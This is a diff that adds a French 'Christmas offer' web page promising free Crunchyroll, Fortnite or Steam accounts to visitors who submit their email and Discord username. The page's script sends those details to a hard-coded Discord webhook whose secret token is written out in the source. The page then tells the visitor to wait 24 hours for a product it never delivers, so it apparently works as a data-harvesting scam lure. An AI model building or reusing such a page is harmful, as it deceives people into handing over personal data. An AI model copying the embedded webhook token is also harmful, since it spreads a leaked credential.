@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Offre de Noël</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input[type="text"], input[type="email"], select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="formContainer">
+        <h1>Offre de Noël</h1>
+        <p>Obtenez un produit gratuit en échange de votre email et pseudo Discord !</p>
+        <form id="offerForm">
+            <select id="product" required>
+                <option value="" disabled selected>Choisissez un produit</option>
+                <option value="Produit 1">Crunchyroll Account</option>
+                <option value="Produit 2">FN Account</option>
+                <option value="Produit 3">Steam Account</option>
+            </select>
+            <input type="text" id="discordUsername" placeholder="Pseudo Discord" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <button type="submit">Obtenir le produit gratuit</button>
+        </form>
+    </div>
+
+    <div class="container" id="confirmationContainer" style="display: none;">
+        <h1>Commande en cours</h1>
+        <p>Attendez environ 24h pour recevoir votre produit par email !</p>
+    </div>
+
+    <script>
+        document.getElementById('offerForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const product = document.getElementById('product').value;
+            const discordUsername = document.getElementById('discordUsername').value;
+            const email = document.getElementById('email').value;
+
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd';
+
+            const data = {
+                content: `Nouveau formulaire soumis !\nProduit: ${product}\nPseudo Discord: ${discordUsername}\nEmail: ${email}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('formContainer').style.display = 'none';
+                    document.getElementById('confirmationContainer').style.display = 'block';
+                } else {
+                    alert('Erreur lors de la soumission du formulaire.');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Erreur lors de la soumission du formulaire.');
+            });
+        });
+    </script>
+</body>
+</html>
